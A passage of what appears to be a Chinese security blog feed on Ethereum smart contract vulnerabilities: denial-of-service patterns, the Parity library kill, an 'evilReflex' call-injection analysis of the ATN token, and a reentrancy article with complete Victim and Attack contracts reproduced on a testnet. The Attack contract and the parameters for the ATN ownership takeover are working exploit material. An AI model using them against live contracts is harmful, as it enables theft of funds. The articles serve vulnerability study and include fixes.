<p>该漏洞的另一个关键点在于循环遍历的数组可以被人为扩充<br>在distribute()函数中使用的循环数组的扩充在invert()函数里面，但是invert()函数是public属性，也就意味着可以创建很多的用户账户，让数组变得非常大，从而使distribute()函数因为超出以太坊区块gas费率上限而无法成功执行</p>
<h1 id="0x08-依赖库问题"><a href="#0x08-依赖库问题" class="headerlink" title="0x08 依赖库问题"></a>0x08 依赖库问题</h1><p>依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。</p>
<p>万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p>
<p>Parity 钱包遭受的第二次攻击是一个很好的例子。</p>
<p>Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。</p>
<p>库合约本质上也不过是另外一个智能合约，这次攻击调用使用的是库合约本身的上下文，对调用者而言这个库合约是未经初始化的。</p>
<p>攻击流程</p>
<p>1.攻击者调用初始化函数把自己设置为库合约的 owner。</p>
<p>2.攻击者调用 kill() 函数，把库合约删除，所有的 ether 就被冻结了</p>
<h1 id="0x09-逻辑设计错误"><a href="#0x09-逻辑设计错误" class="headerlink" title="0x09 逻辑设计错误"></a>0x09 逻辑设计错误</h1><p>本类型漏洞分析Edgeware锁仓合约的拒绝服务漏洞</p>
<p>Edgeware锁仓合约可以理解为你往银行里定期存款，之后会给你收益，关键点在于发送token后要进行lock操作，把你的资金锁起来，暂时无法提现，本类型漏洞会导致参与者lock失败，从而无法获得收益。</p>
<p>关键代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lock</span>(<span class="params">Term term, bytes calldata edgewareAddr, bool isValidator</span>)</span></span><br><span class="line"><span class="function">       <span class="title">external</span></span></span><br><span class="line"><span class="function">       <span class="title">payable</span></span></span><br><span class="line"><span class="function">       <span class="title">didStart</span></span></span><br><span class="line"><span class="function">       <span class="title">didNotEnd</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       uint256 eth = msg.value;</span><br><span class="line">       address owner = msg.sender;</span><br><span class="line">       uint256 unlockTime = unlockTimeForTerm(term);</span><br><span class="line">       <span class="comment">// Create ETH lock contract</span></span><br><span class="line">       Lock lockAddr = (<span class="keyword">new</span> Lock).value(eth)(owner, unlockTime);</span><br><span class="line">       <span class="comment">// ensure lock contract has at least all the ETH, or fail</span></span><br><span class="line">       assert(address(lockAddr).balance &gt;= msg.value);</span><br><span class="line">       emit Locked(owner, eth, lockAddr, term, edgewareAddr, isValidator, now);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title"><span class="built_in">assert</span></span>(<span class="title">address</span>(<span class="variable">lockAddr</span>).balance &gt;= <span class="variable">msg.value</span>);</span></span><br></pre></td></tr></table></figure>
<p>​    这段代码做了强制判断：属于参与者的 Lock 合约的金额必须等于参与者锁仓时发送的金额，如果不等于，意味着 lock 失败，这个失败会导致参与者的 Lock 合约“瘫痪”而形成“拒绝服务”，直接后果就是：假如攻击持续着，Edgeware 这个 Lockdrop 机制将不再可用。    但这个漏洞对参与者的资金无影响。那么，什么情况下会导致“address(lockAddr).balance 不等于 msg.value” 攻击者如果能提前推测出参与者的 Lock 合约地址就行（这在以太坊黄皮书里有明确介绍，可以计算出来），此时攻击者只需提前往参与者的 Lock 合约地址随便转点 ETH 就好，就会导致参与者无法lock从而无法获取收益</p>
<h1 id="0x0a-防御措施"><a href="#0x0a-防御措施" class="headerlink" title="0x0a 防御措施"></a>0x0a 防御措施</h1><ul>
<li><p>未设定gas费率的外部调用</p>
<p>使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p>
</li>
<li><p>依赖外部的调用进展</p>
<p>在竞拍合约中尽量让合约参与者自提参与竞拍的token，其次如果确实需要对外部函数调用的结果进行处理才能进入新的状态，请考虑外部调用可能一直失败的情况，也可以添加基于时间的操作，防止外部函数调用一直无法满足require判断。</p>
</li>
<li><p>owner错误操作</p>
<p>建议设计多个owner地址，避免密钥遗失等问题发生时，导致合约被锁，同时一个综合系统中只有一个绝对权限的管理员是极其不安全的。</p>
</li>
<li><p>数组或映射过长</p>
<p>避免需要循环操作的数组或映射能够被外部调用，同时在合理的增长过程，可以采用分区块处理的方式，避免数组或映射过大失败。</p>
</li>
<li><p>依赖库问题</p>
<p>继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</p>
</li>
<li><p>逻辑设计错误</p>
<p>合约正式上链之前一定要进行审计，避免未知的情况发生。特别是判断条件，慎之又慎。之前的有一个案例</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">require</span>(<span class="variable">msg.<span class="class">sender</span></span>==<span class="variable">owner</span>);<span class="title">require</span>(<span class="variable">msg.<span class="class">sender</span></span><span class="variable">!</span>=<span class="variable">owner</span>);</span></span><br></pre></td></tr></table></figure>
<p>本应该是上面的写法却写成了下面的代码。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈智能合约evilReflex漏洞</title>
    <url>/2021/07/21/21/</url>
    <content><![CDATA[<h1 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01 漏洞简述"></a>0x01 漏洞简述</h1><ul>
<li><code>漏洞名称</code>：evilReflex漏洞(call注入攻击)</li>
<li><code>漏洞危害</code>：攻击者可以通过该漏洞将存在存在evilReflex漏洞的合约中的任意数量的token转移到任意地址</li>
<li><code>影响范围</code>：多个ERC233标准智能合约</li>
</ul>
<h1 id="0x02-预备知识"><a href="#0x02-预备知识" class="headerlink" title="0x02 预备知识"></a>0x02 预备知识</h1><p>文章首发<a href="https://xz.aliyun.com/t/9898">先知社区</a></p>
<p>智能合约的外部调用方式-<code>call</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用方式</span></span><br><span class="line">&lt;address&gt;.call(bytes) <span class="comment">//Call消息传递</span></span><br><span class="line">&lt;address&gt;.call(函数选择器, arg1, arg2, …) </span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>Call消息传递</code></p>
<p><code>call()</code>是一个底层的接口，用来向一个合约发送消息，也就是说如果你想实现自己的消息传递，可以使用这个函数。函数支持传入任意类型的任意参数，并将参数打包成32字节，相互拼接后向合约发送这段数据。</p>
</li>
<li><p><code>Call指定函数</code></p>
<p>如果第一个参数刚好是四个字节，会认为这四个字节指定的是函数签名的序号值，从而去调用目标合约中对应的函数。</p>
<p>函数选择器(Function Selector) 该函数签名的 Keccak 哈希的前 4 字节</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params">uint32 x, bool y</span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">bool r</span>) </span>&#123; r = x &gt; <span class="number">32</span> || y; &#125;</span><br><span class="line">sha3.keccak_256(b<span class="string">&#x27;baz(uint32,bool)&#x27;</span>).hexdigest()[<span class="number">0</span>:<span class="number">8</span>]</span><br><span class="line"><span class="comment">//cdcd77c0</span></span><br><span class="line">如果我们想调用baz函数，此处的函数选择器就是<span class="number">0xcdcd77c0</span></span><br></pre></td></tr></table></figure>
<p>想要深入了解参考<a href="https://solidity-cn.readthedocs.io/zh/develop/abi-spec.html">文章1</a>，<a href="https://hitcxy.com/2021/argument-encoding/">文章2</a></p>
</li>
</ul>
<h1 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h1><h2 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract evilreflex&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">info</span>(<span class="params">bytes data</span>)</span>&#123;</span><br><span class="line">          <span class="built_in">this</span>.call(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="built_in">this</span> == msg.sender);</span><br><span class="line">      	<span class="comment">// this 当前实例化的合约对象 </span></span><br><span class="line">        <span class="comment">// secret operations</span></span><br><span class="line">      	……</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个示例中如果我们想要使用<code>secret</code>函数，但是该函数只能合约本身调用，显然我们无法满足<code>require</code>条件，我们就没办法使用<code>secret</code>函数。但是我们发现在<code>info</code>函数中使用了<code>call</code>函数，并且外界是可以直接控制 <code>call</code>函数的字节数组的，我们就可以这样</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.call(bytes4(keccak256(<span class="string">&quot;secret()&quot;</span>)));</span><br></pre></td></tr></table></figure>
<p>此时就可以实现调用secret函数，实现了权限绕过。</p>
<h2 id="bytes注入"><a href="#bytes注入" class="headerlink" title="bytes注入"></a>bytes注入</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">approveAndCallcode</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">address _spender,</span></span></span><br><span class="line"><span class="function"><span class="params">uint256 _value,</span></span></span><br><span class="line"><span class="function"><span class="params">bytes _extraData</span>) </span></span><br><span class="line"><span class="function"><span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">    allowed[msg.sender][_spender] = _value;</span><br><span class="line">    Approval(msg.sender,_spender,_value);</span><br><span class="line">    <span class="keyword">if</span>(!_spender.call(_extraData))&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>上述函数的功能是用来完成<code>approve</code>操作时发出相关的调用通知，但是使用了call函数，且参数<code>_spender</code>,<code>_extraData</code>可控，通过预备知识我们可以通过消息传递的方式去调用合约上的任何函数。比如</p>
<ul>
<li><code>adress.tranfer()</code>  让合约向指定地址转token</li>
<li><code>approval()</code>    实现任意token授权</li>
</ul>
<h2 id="方法选择器注入"><a href="#方法选择器注入" class="headerlink" title="方法选择器注入"></a>方法选择器注入</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logAndCall</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">address _to, </span></span></span><br><span class="line"><span class="function"><span class="params">uint _value, </span></span></span><br><span class="line"><span class="function"><span class="params">bytes data, </span></span></span><br><span class="line"><span class="function"><span class="params">string _fallback</span>)</span>&#123;</span><br><span class="line">         ……</span><br><span class="line">         assert(_to.call(bytes4(keccak256(_fallback)),msg.sender, _value, _data)) ;</span><br><span class="line">         ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_fallback</code>参数可控，也就意味着可以调用任何函数，但是后面的三个参数如果和目标函数的参数个数，类型不对应怎么办？这里涉及到EVM的call函数簇的调用特性函数簇在调用函数的过程中，会自动忽略多余的参数，这又额外增加了 <code>call</code> 函数簇调用的自由度。</p>
<p><code>简单演示</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line">contract A &#123;</span><br><span class="line">    uint256 public aa = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">uint256 a</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        aa = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callFunc</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.call(bytes4(keccak256(<span class="string">&quot;test(uint256)&quot;</span>)), <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例子中 <code>test()</code> 函数仅接收一个 <code>uint256</code> 的参数，但在 <code>callFunc()</code> 中传入了三个参数，由于 <code>call</code> 自动忽略多余参数，所以成功调用了 <code>test()</code> 函数。</p>
<h1 id="0x04-真实案例分析"><a href="#0x04-真实案例分析" class="headerlink" title="0x04 真实案例分析"></a>0x04 真实案例分析</h1><p>ATN代币增发</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (isContract(_to)) &#123;</span><br><span class="line">        ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);</span><br><span class="line">        receiver.call.value(<span class="number">0</span>)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setOwner</span>(<span class="params">address owner_</span>) <span class="title">public</span> <span class="title">auth</span> </span>&#123;</span><br><span class="line">    owner = owner_;</span><br><span class="line">    emit LogSetOwner(owner);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">modifier auth &#123;</span><br><span class="line">    <span class="built_in">require</span>(isAuthorized(msg.sender, msg.sig));</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAuthorized</span>(<span class="params">address src, bytes4 sig</span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (src == address(<span class="built_in">this</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (src == owner) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (authority == DSAuthority(<span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> authority.canCall(src, <span class="built_in">this</span>, sig);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>transferFrom()</code> 函数中危险的使用了call函数，同时<code>_custom_fallback</code>，<code>_from</code></p>
<p>参数可控，我们就可以去调用该合约上的任何函数，同时<code>_to</code>传入的参数要求是一个合约地址，我们就可以传入该合约的地址，被实例化的<code>receiver</code>执行<code>call</code>函数就能实现合约上的任意函数使用。</p>
<p><code>setOwner()</code>函数可以设定合约的管理员，我们就能在调用<code>transferFrom()</code>时的参数设定为</p>
<ul>
<li><code>_custom_fallback</code>  <code>setOwner(adress)</code></li>
<li><code>_from</code>  自己的账号地址</li>
<li><code>_to</code>   当前合约地址</li>
</ul>
<p>与此同时，<code>call</code> 调用已经将 <code>msg.sender</code> 转换为了合约本身的地址，也就绕过了 <code>isAuthorized()</code> 的权限认证</p>
<h1 id="0x05-复现"><a href="#0x05-复现" class="headerlink" title="0x05 复现"></a>0x05 复现</h1><p><a href="https://cn.etherscan.com/address/0x461733c17b0755ca5649b6db08b3e213fcf22546#code">代码地址</a>在remix上部署到rinkeby测试链之后，查询owner</p>
<p><img src="/2021/07/21/21/截屏2021-07-20 18.02.28.png" alt="截屏2021-07-20 18.02.28"></p>
<p>根据上面的真实案例分析，填入相应的参数，之后执行</p>
<p><img src="/2021/07/21/21/image-20210721185931721.png" alt="image-20210721185931721"></p>
<p>再次查询，发现合约的拥有者已经改变，攻击成功！</p>
<p><img src="/2021/07/21/21/image-20210721185859308.png" alt="image-20210721185859308"></p>
<h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>call函数，它提供了不完全公开代码的情况下的ABI调用的方式。除了函数调用，消息传输意外，亦可以实现转账等等。但是其不正确的使用，带来了诸多的问题，本文分析的evilReflex漏洞只是call函数发生的一种，例如重入攻击，dos攻击等等。开发者在开发过程中尽量避免使用call函数，如果确实需要使用，对于传入的参数一定要不能被外部控制。</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>深入智能合约重入漏洞</title>
    <url>/2021/07/22/22/</url>
    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>智能合约的重入漏洞是一个非常经典的漏洞，其产生了非常严重的后果，诸如以太坊分叉等。本文将深入分析其产生的原因和预防机制。</p>
<h1 id="0x02-预备知识"><a href="#0x02-预备知识" class="headerlink" title="0x02 预备知识"></a>0x02 预备知识</h1><ol>
<li><p>合约地址与外部地址的异同</p>
<p><strong>外部账户 EOA</strong></p>
<ul>
<li>由私钥控制</li>
<li>拥有 ether 余额</li>
<li>可以直接发送交易</li>
<li>不包含相关执行代码</li>
<li>可以与合约进行交互，使其执行其上存储的代码</li>
</ul>
<p><strong>合约账户</strong></p>
<ul>
<li>无法使用私钥控制</li>
<li>拥有 ether 余额</li>
<li>通过代码发送交易</li>
<li>含有执行代码</li>
<li>当被外部调用时，可以执行相应代码</li>
<li>拥有自己的独立存储状态，且可以调用其他合约</li>
</ul>
</li>
<li><p><code>fallback</code>函数</p>
<p>也被称为回调函数，在官方文档中时这么描述的</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">A contract can have exactly one unnamed <span class="keyword">function</span>. This <span class="keyword">function</span> cannot have arguments <span class="keyword">and</span> cannot <span class="keyword">return</span> anything. It <span class="keyword">is</span> executed <span class="keyword">on</span> a <span class="keyword">call</span> <span class="keyword">to</span> the contract <span class="keyword">if</span> <span class="keyword">none</span> <span class="keyword">of</span> the other <span class="keyword">functions</span> match the given <span class="keyword">function</span> identifier (<span class="keyword">or</span> <span class="keyword">if</span> <span class="keyword">no</span> data was supplied at <span class="keyword">all</span>).</span><br></pre></td></tr></table></figure>
<p>默认的<code>fallback</code>函数在合约实例中表现形式即为当且仅当只有一个不带参数没有返回值的匿名函数，可以被<strong>重写</strong>。</p>
<p>fallback函数被调用的时机：</p>
<ul>
<li>当外部账户或其他合约向该合约地址发送 ether 时；</li>
<li>当外部账户或其他合约调用了该合约一个<strong>不存在</strong>的函数时；</li>
</ul>
</li>
<li><p>call函数</p>
</li>
</ol>
<p>对于一个合约来说，我们要实现对其的使用，也就是外部调用，就需要使用到call函数。这种情况下call 有两种使用方式</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.call(bytes) <span class="comment">//Call消息传递</span></span><br><span class="line">&lt;address&gt;.call(函数选择器, arg1, arg2, …) <span class="comment">//Call函数调用</span></span><br></pre></td></tr></table></figure>
<p>call函数的返回值为true或者false。当且仅当消息传递或函数调用成功时发挥true，其余情况如消息传递失败，函数调用失败，gas费率超出区块上限等时，返回false。</p>
<p>call的另外一种很重要的作用就是转账，其使用方式为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.call.value(account).gas(limit_gas)()</span><br></pre></td></tr></table></figure>
<p>并且call函数是transfer与send的底层函数</p>
<h1 id="0x03-简单分析"><a href="#0x03-简单分析" class="headerlink" title="0x03 简单分析"></a>0x03 简单分析</h1><p>来看一段代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (amount &lt;= balances[msg.sender]) &#123;</span><br><span class="line">    msg.sender.call.value(_amount)();</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数的功能是实现提款操作。用户输入提现的金额，函数对用户的余额进行判断，如果大于等于提现的金额，就使用call函数进行转账，在对用户余额进行相应的扣除。认真读下来似乎没有什么问题，但是在call函数的使用上存在明显的错误。下面将进行分析</p>
<p>如果msg.sender是一个外部地址的话，是正常的转账操作，不会出现什么问题。<br>但是如果msg.sender是一个合约地址的话，call未指定调用的函数，就会默认调用<br>调用fallback函数。此时用到fallback函数的另一个性质，可以被重写。</p>
<p>此时我们的withdraw函数的执行停止在  msg.sender.call.value(_amount)();这一行，也就是说我们在合约的上面的余额还没有被扣除，我们依旧能够绕过                if (amount &lt;= balances[msg.sender])的判断进行转账操作，我们可以这么写</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;</span><br><span class="line">        victim.withDraw(mag.value);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次我们使用withdraw函数时，受害合约会使用call给我们的合约转账，由于没有指定调用函数，会默认调用我们写的fallback函数中，我们在fallback函数中再次调用受害合约的withdraw函数，从而再次给我们转账，又会再一次触发我们的写fallback函数，如此往复陷入一个循环。</p>
<p>此循环的结束条件：</p>
<ul>
<li>合约的余额不足以给我们的合约转账的时候</li>
<li>本次调用的gas费率达到上限—Gas Limit</li>
</ul>
<p>那么对于存在这种问题的合约如何攻击呢？</p>
<h1 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract  Victim &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;  </span><br><span class="line"></span><br><span class="line">    event withdrawLog(address, uint256);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Victim</span>(<span class="params"></span>) </span>&#123; owner = msg.sender; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; </span><br><span class="line">      balances[msg.sender] += msg.value; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 amount</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt;= amount);</span><br><span class="line">        withdrawLog(msg.sender, amount);  </span><br><span class="line">        msg.sender.call.value(amount)();  </span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params"></span>) <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123; </span><br><span class="line">      <span class="keyword">return</span> balances[msg.sender]; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address addr</span>) <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123; </span><br><span class="line">      <span class="keyword">return</span> balances[addr]; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>让我们把受害合约的功能简单完善一下</p>
<ul>
<li>owner 记录合约所有者</li>
<li>balances 记录参与者的参与资金情况</li>
<li>withdrawLog 记录每一次转账</li>
<li>victim() 构造函数，对合约进行初始化，设定合约所有者</li>
<li>deposit() 用于接受参与者的资金，并更新记录</li>
<li>withdraw() 用于提款</li>
<li>balanceOf() 查询本合约的余额</li>
<li>balanceOf(address addr) 查询指定地址的余额</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    address victim;</span><br><span class="line">    modifier ownerOnly &#123; <span class="built_in">require</span>(owner == msg.sender); _; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; owner = msg.sender; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setVictim_adress</span>(<span class="params">address target</span>) <span class="title">ownerOnly</span> </span>&#123; </span><br><span class="line">    		victim = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sendmoney</span>(<span class="params"></span>) <span class="title">ownerOnly</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.balance &gt;= <span class="number">1</span> ether) &#123;</span><br><span class="line">            victim.call.value(<span class="number">1</span> ether)(bytes4(keccak256(<span class="string">&quot;deposit()&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        victim.call(bytes4(keccak256(<span class="string">&quot;withdraw(uint256)&quot;</span>)), <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startAttack</span>(<span class="params"></span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        sendmoney();</span><br><span class="line">        withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stopAttack</span>(<span class="params"></span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        victim.call(bytes4(keccak256(<span class="string">&quot;withdraw(uint256)&quot;</span>)), <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完善我们的攻击合约：</p>
<ul>
<li>owner 记录合约所有者</li>
<li>victim 记录受害合约地址</li>
<li>ownerOnly 设置仅供合约中调用的关键词</li>
<li>Attack() 构造函数，对合约进行初始化，设定合约所有者</li>
<li>setVictim()  设定受害合约地址</li>
<li>sendmoney() 调用victim的deposit()进行转账</li>
<li>withdraw() 调用victim的withdraw()进行转账</li>
<li>startAttack() 集合sendmoney()与withdraw()</li>
<li>stopAttack()  使用自毁函数将攻击合约的资金转移到owner账户</li>
<li>()  重写fallback函数</li>
</ul>
<h2 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h2><p>使用<a href="https://remix.ethereum.org/">remix</a>部署受害合约之后，使用账户一打入5eth，可以从以太坊浏览器上面<a href="https://rinkeby.etherscan.io/address/0x7005f99d4a6aFF6c8A6f3aB36d78BF4cF2Adb106#internaltx">查询</a>到</p>
<p><img src="/2021/07/22/22/image-20210722133001108.png" alt="image-20210722133001108"></p>
<p>此时我们切换到我们的账户二，部署攻击合约，同时调用setVictim实例化一下</p>
<p><img src="/2021/07/22/22/截屏2021-07-22 15.05.46.png" alt="截屏2021-07-22 15.05.46"></p>
<p>此时便可以调用startAttack进行攻击，在调用的时候需要多一些gas，避免失败</p>
<p>攻击成功后，可以查询到所有攻击流程</p>
<p><img src="/2021/07/22/22/截屏2021-07-22 15.09.39.png" alt="截屏2021-07-22 15.09.39"></p>
<p><img src="/2021/07/22/22/image-20210722151041460.png" alt="image-20210722151041460"></p>
<p>最后调用stopattack转钱跑路</p>
<p><img src="/2021/07/22/22/image-20210722151254363.png" alt="image-20210722151254363"></p>
<p>复现的时候注意把握合约的余额与调用一次withdraw提现余额之间的关系，建议在1-5倍之间，避免发生out of gas 从而导致攻击失败</p>
<h1 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h1><ol>
<li>指定gas费率，一次转账仅需消耗21000gas，可以这么做</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">msg.sender.call.value(amount).gas(<span class="number">23000</span>)();</span><br><span class="line"><span class="comment">//因为可能存在其他的计算，如果只制定21000，会有较高的机率发生失败，因此需要预留一部分gas</span></span><br></pre></td></tr></table></figure>
<ol>
<li>使用其他转账函数</li>
</ol>
<ul>
<li><p><strong>send</strong>    address.send(uint256 amount) returns (bool)</p>
</li>
<li><p>向address发送amount数量的Wei（注意单位），如果执行失败返回false。发送的同时传输2300gas，gas数量不可调整</p>
</li>
<li><p><strong>transfer</strong>   address.transfer(uint256 amount)</p>
</li>
